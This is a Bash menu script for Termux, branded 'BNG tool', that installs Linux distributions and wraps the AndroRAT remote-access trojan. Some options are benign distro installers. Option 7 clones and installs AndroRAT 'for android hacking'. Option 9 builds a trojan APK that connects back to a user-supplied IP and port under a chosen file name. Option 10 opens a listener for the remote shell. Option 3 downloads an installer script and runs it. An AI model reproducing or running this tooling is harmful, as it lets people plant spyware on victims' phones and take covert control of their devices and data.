#!bin/bash
clear
function main(){
echo -e "\e[34m
██████╗░███╗░░██╗░██████╗░
██╔══██╗████╗░██║██╔════╝░
██████╦╝██╔██╗██║██║░░██╗░
██╔══██╗██║╚████║██║░░╚██╗
██████╦╝██║░╚███║╚██████╔╝
╚═════╝░╚═╝░░╚══╝░╚═════╝░ \e[0m
\e[34m"
echo -e "\e[32mwelcome to BNG tool !"
echo -e "\e[34m-----------------------------"
echo -e "\e[35m made by : salehbng"
echo -e "\e[35m telegram : SalehBNG0"
echo -e "\e[34m-----------------------------"
echo -e "\e[33m[1] : install ubuntu in termux "
echo -e "\e[33m[2] : install debian in termux "
echo -e "\e[33m[3] : install kali linux in termux "
echo -e "\e[33m[4] : run ubuntu "
echo -e "\e[33m[5] : run debian "
echo -e "\e[33m[6] : run nethuter (kali linux)"
echo -e "\e[33m[7] : install androrat for android hacking"
echo -e "\e[33m[8] : my ip"
echo -e "\e[33m[9] : make trojan (androrat)"
echo -e "\e[33m[10]: go to shell (androrat)"
echo -e "\e[33m[11]: Clear and reprint the banner"
echo -e "\e[33m[0] : exit "
echo -e "\e[34m-----------------------------"
}
main
while true; do
	echo -n -e "\e[91mEnter something >>> : "
	read name
	if [ "$name" == "1" ]
		then
		echo -e "\e[31m installing ubuntu . . ."
		pkg install proot-distro
		proot-distro install ubuntu
		echo -e "\e[32m installing completed \e[0m"
		sleep 3
		clear
		main
	elif [ "$name" == "2" ]
	then
		echo -e "\e[32m installing debian . . . "
		pkg install proot-distro
		proot-distro install debian
		echo -e "\e[32m installing completed \e[0m"
		sleep 3
		clear
		main
	elif [ "$name" == "3" ]
	then
		echo -e "\e[32m Access phone files\e[0m"
		termux-setup-storage
		sleep 3
		echo -e "\e[32m install wget . . .\e[0m"
		pkg install wget
		sleep 3
		wget -O install-nethunter-termux https://offs.ec/2MceZWr
		sleep 3
		chmod +x install-nethunter-termux
		sleep 3
		echo -e "\e[32m] Go to the installation environment\e[0m]"
		bash install-nethunter-termux
		echo -e "\e[32m installing completed\e[0m"
		sleep 4
		clear
		main
	elif [ "$name" == "4" ]
	then
		proot-distro login ubuntu
		echo -e "\e[37m"
		sleep 3
		clear
		main
	elif [ "$name" == "5" ]
	then 
		proot-distro login debian
		sleep 3
		clear
		main
	elif [ "$name" == "6" ]
	then
		nethunter
		sleep 3
		clear
		main
	elif [ "$name" == "0" ]
	then
		echo -e "\e[32mThanks for using (:\e[0m"
		break
	elif [ "$name" == "7" ]
	then
		echo -e "\e[32m Access phone files :\e[0m"
		sleep 2
		termux-setup-storage
                pkg update
                pkg upgrade
                echo -e "\e[32m install openjdk-17 :"
                pkg install openjdk-17
                echo -e "\e[32m installing completed \e[0m"
                echo -e "\e[32m install aapt :"
                pkg install aapt
                echo -e "\e[32m installing completed \e[0m"
                echo -e "\e[32m install git"
                pkg install git
                echo -e "\e[32m installing completed\e[0m"
                echo -e "\e[32m install python : "
                pkg install python    
                pkg install python-pip
                echo -e "\e[32m installing completed\e[0m"
                echo -e "\e[32m cloning androrat :"
                git clone https://github.com/karma9874/AndroRAT.git
                echo -e "\e[32m cloning completed\e[0m"
                cd AndroRAT
                echo "\e[32m install libary for python :"
                pip install -r requirements.txt
                echo -e "\e[32m installing completed \e[0m"
                echo -e "\e[33m {/\} (:"
		sleep 3
		clear
		main

	elif [ "$name" == "8" ]
	then
		echo -e "\e[45m IPs usually start with 192.168 !\e[0m"
		echo -e "\e[33m ----------------------------------"
		ifconfig
		continue
	elif [ "$name" == "9" ]
	then
		printf letsgo !!!
		cd AndroRAT
		echo -n -e "\e[31m enter your ip : "
		read king
		echo -n -e "\e[31m enter port : "
		read port
		t=".apk"
		echo -n -e "\e[34m enter name trojan : "
		read os
		python androRAT.py --build -i $king -p $port -o $os$t
		mv /data/data/com.termux/files/home/AndroRAT/$os$t /data/data/com.termux/files/home/storage/downloads 
		echo -e "\e[32m file saved in /data/data/com.termux/files/home/storage/downloads (: !\e[0m"
	elif [ "$name" == "10" ]
	then
		cd AndroRAT
		printf go to shell . . .
		echo -n -e "\e[32m enter port : "
		read po 
		sleep 4
		python androRAT.py --shell -i 0.0.0.0 -p $po
	elif [ "$name" == "11" ]
	then
		clear
echo -e "\e[34m
██████╗░███╗░░██╗░██████╗░
██╔══██╗████╗░██║██╔════╝░
██████╦╝██╔██╗██║██║░░██╗░
██╔══██╗██║╚████║██║░░╚██╗
██████╦╝██║░╚███║╚██████╔╝
╚═════╝░╚═╝░░╚══╝░╚═════╝░"

echo -e "\e[32mwelcome to BNG tool !"
echo -e "\e[34m-----------------------------"
echo -e "\e[35m made by : salehbng"
echo -e "\e[35m telegram : SalehBNG0"
echo -e "\e[34m-----------------------------"
echo -e "\e[33m[1] : install ubuntu in termux "
echo -e "\e[33m[2] : install debian in termux "
echo -e "\e[33m[3] : install kali linux in termux "
echo -e "\e[33m[4] : run ubuntu "
echo -e "\e[33m[5] : run debian "
echo -e "\e[33m[6] : run nethuter (kali linux)"
echo -e "\e[33m[7] : for mabahm : (install androrat)"
echo -e "\e[33m[8] : show ip : (mabham)"
echo -e "\e[33m[9] : make trojan : (mabham)"
echo -e "\e[33m[10]: go to shell : (mabham)"
echo -e "\e[33m[11]: Clear and reprint the banner"
echo -e "\e[33m[0] : exit "
echo -e "\e[34m-----------------------------"
 	else
    	    echo -e "command not found"
	fi
done

